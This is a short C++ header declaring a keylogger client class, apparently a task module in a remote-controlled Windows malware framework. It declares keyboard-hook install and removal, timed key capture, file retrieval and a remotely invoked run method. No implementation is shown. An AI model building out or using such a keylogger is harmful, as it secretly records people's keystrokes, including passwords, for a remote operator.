#pragma once
#include <iostream>
#include <Windows.h>
#include <functional>
#include <task\base\base_task.h>

class keylogger_client : public client::base::base_task
{
	MSG msg;
	BOOL bRet;
	uint32_t seconds;

	std::string file_name;

	BOOL GetMessageWithTimeout(MSG *msg, UINT to);
	bool install_hook();
	bool uninstall_hook();
	void recv_file();
public:
	keylogger_client();
	~keylogger_client();
	bool capture_keys(std::string seconds);
	void execute();
	void on_execute();
	void run(
		std::string id,
		bool response,
		std::string method,
		std::vector<std::string> args
	);
	_function fetch_function(std::string);

	static keylogger_client* get();
};

